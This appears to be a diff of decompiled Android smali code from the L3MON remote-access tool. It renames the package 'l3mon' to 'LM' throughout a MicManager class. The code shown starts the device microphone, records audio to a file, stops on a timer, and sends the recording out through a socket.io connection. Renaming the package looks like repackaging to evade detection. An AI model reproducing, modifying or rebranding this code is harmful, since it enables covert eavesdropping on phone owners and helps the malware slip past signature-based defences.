@@ -1,4 +1,4 @@
-.class public Lcom/etechd/l3mon/MicManager;
+.class public Lcom/etechd/LM/MicManager;
 .super Ljava/lang/Object;
 .source "MicManager.java"
 
@@ -20,7 +20,7 @@
     .line 21
     const/4 v0, 0x0
 
-    sput-object v0, Lcom/etechd/l3mon/MicManager;->audiofile:Ljava/io/File;
+    sput-object v0, Lcom/etechd/LM/MicManager;->audiofile:Ljava/io/File;
 
     return-void
 .end method
@@ -39,7 +39,7 @@
     .param p0, "x0"    # Ljava/io/File;
 
     .line 17
-    invoke-static {p0}, Lcom/etechd/l3mon/MicManager;->sendVoice(Ljava/io/File;)V
+    invoke-static {p0}, Lcom/etechd/LM/MicManager;->sendVoice(Ljava/io/File;)V
 
     return-void
 .end method
@@ -106,11 +106,11 @@
     invoke-virtual {v3, v5, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
 
     .line 75
-    invoke-static {}, Lcom/etechd/l3mon/IOSocket;->getInstance()Lcom/etechd/l3mon/IOSocket;
+    invoke-static {}, Lcom/etechd/LM/IOSocket;->getInstance()Lcom/etechd/LM/IOSocket;
 
     move-result-object v5
 
-    invoke-virtual {v5}, Lcom/etechd/l3mon/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v5}, Lcom/etechd/LM/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v5
 
@@ -183,7 +183,7 @@
     .end annotation
 
     .line 30
-    invoke-static {}, Lcom/etechd/l3mon/MainService;->getContextOfApplication()Landroid/content/Context;
+    invoke-static {}, Lcom/etechd/LM/MainService;->getContextOfApplication()Landroid/content/Context;
 
     move-result-object v0
 
@@ -211,7 +211,7 @@
 
     move-result-object v1
 
-    sput-object v1, Lcom/etechd/l3mon/MicManager;->audiofile:Ljava/io/File;
+    sput-object v1, Lcom/etechd/LM/MicManager;->audiofile:Ljava/io/File;
     :try_end_0
     .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -223,33 +223,33 @@
 
     invoke-direct {v1}, Landroid/media/MediaRecorder;-><init>()V
 
-    sput-object v1, Lcom/etechd/l3mon/MicManager;->recorder:Landroid/media/MediaRecorder;
+    sput-object v1, Lcom/etechd/LM/MicManager;->recorder:Landroid/media/MediaRecorder;
 
     .line 42
-    sget-object v1, Lcom/etechd/l3mon/MicManager;->recorder:Landroid/media/MediaRecorder;
+    sget-object v1, Lcom/etechd/LM/MicManager;->recorder:Landroid/media/MediaRecorder;
 
     const/4 v2, 0x1
 
     invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setAudioSource(I)V
 
     .line 43
-    sget-object v1, Lcom/etechd/l3mon/MicManager;->recorder:Landroid/media/MediaRecorder;
+    sget-object v1, Lcom/etechd/LM/MicManager;->recorder:Landroid/media/MediaRecorder;
 
     const/4 v2, 0x2
 
     invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setOutputFormat(I)V
 
     .line 44
-    sget-object v1, Lcom/etechd/l3mon/MicManager;->recorder:Landroid/media/MediaRecorder;
+    sget-object v1, Lcom/etechd/LM/MicManager;->recorder:Landroid/media/MediaRecorder;
 
     const/4 v2, 0x3
 
     invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V
 
     .line 45
-    sget-object v1, Lcom/etechd/l3mon/MicManager;->recorder:Landroid/media/MediaRecorder;
+    sget-object v1, Lcom/etechd/LM/MicManager;->recorder:Landroid/media/MediaRecorder;
 
-    sget-object v2, Lcom/etechd/l3mon/MicManager;->audiofile:Ljava/io/File;
+    sget-object v2, Lcom/etechd/LM/MicManager;->audiofile:Ljava/io/File;
 
     invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
 
@@ -258,28 +258,28 @@
     invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V
 
     .line 46
-    sget-object v1, Lcom/etechd/l3mon/MicManager;->recorder:Landroid/media/MediaRecorder;
+    sget-object v1, Lcom/etechd/LM/MicManager;->recorder:Landroid/media/MediaRecorder;
 
     invoke-virtual {v1}, Landroid/media/MediaRecorder;->prepare()V
 
     .line 47
-    sget-object v1, Lcom/etechd/l3mon/MicManager;->recorder:Landroid/media/MediaRecorder;
+    sget-object v1, Lcom/etechd/LM/MicManager;->recorder:Landroid/media/MediaRecorder;
 
     invoke-virtual {v1}, Landroid/media/MediaRecorder;->start()V
 
     .line 50
-    new-instance v1, Lcom/etechd/l3mon/MicManager$1;
+    new-instance v1, Lcom/etechd/LM/MicManager$1;
 
-    invoke-direct {v1}, Lcom/etechd/l3mon/MicManager$1;-><init>()V
+    invoke-direct {v1}, Lcom/etechd/LM/MicManager$1;-><init>()V
 
-    sput-object v1, Lcom/etechd/l3mon/MicManager;->stopRecording:Ljava/util/TimerTask;
+    sput-object v1, Lcom/etechd/LM/MicManager;->stopRecording:Ljava/util/TimerTask;
 
     .line 61
     new-instance v1, Ljava/util/Timer;
 
     invoke-direct {v1}, Ljava/util/Timer;-><init>()V
 
-    sget-object v2, Lcom/etechd/l3mon/MicManager;->stopRecording:Ljava/util/TimerTask;
+    sget-object v2, Lcom/etechd/LM/MicManager;->stopRecording:Ljava/util/TimerTask;
 
     mul-int/lit16 v3, p0, 0x3e8
 
